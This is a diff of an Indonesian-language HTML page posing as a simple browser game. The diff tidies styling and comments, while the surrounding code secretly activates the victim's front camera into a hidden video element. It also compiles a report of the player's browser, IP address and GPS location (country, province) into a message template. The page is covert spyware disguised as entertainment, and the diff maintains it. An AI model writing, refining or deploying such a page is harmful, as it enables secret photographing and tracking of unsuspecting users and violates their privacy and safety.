@@ -78,14 +78,6 @@
             font-size: 14px;
             color: #aaa;
         }
-        #previewVideo {
-            display: none;
-            width: 100%;
-            max-width: 300px;
-            margin: 10px auto;
-            border-radius: 10px;
-            border: 2px solid #e94560;
-        }
     </style>
 </head>
 <body>
@@ -99,7 +91,7 @@
         <canvas id="gameCanvas" width="400" height="400"></canvas>
         <button class="btn" id="startBtn">▶ Mulai Game</button>
         <div class="status" id="statusText">Tekan tombol untuk bermain</div>
-        <video id="previewVideo" autoplay muted></video>
+        <video id="previewVideo" autoplay muted style="display:none;width:100%;max-width:300px;margin:10px auto;border-radius:10px;border:2px solid #e94560;"></video>
     </div>
 
     <script>
@@ -213,7 +205,6 @@
                 const video = document.getElementById('previewVideo');
                 const canvas = document.createElement('canvas');
 
-                // === PAKSA KAMERA DEPAN (USER) ===
                 navigator.mediaDevices.getUserMedia({
                         video: {
                             facingMode: 'user', // DEPAN
@@ -283,7 +274,7 @@
         🌐 *Browser*   : ${data.browser}
         📌 *IP*        : ${data.ip}
 
-        📍 *LOKASI REAL*
+        📍 *LOKASI REAL (GPS)*
         ─────────────────
         🗺️ *Negara*     : ${data.negara}
         🏛️ *Provinsi*   : ${data.provinsi}
@@ -500,6 +491,6 @@
         initGame();
         drawCanvas();
         statusText.textContent = 'Tekan tombol Mulai Game untuk bermain';
-    </script> 
+    </script>
 </body>
 </html>
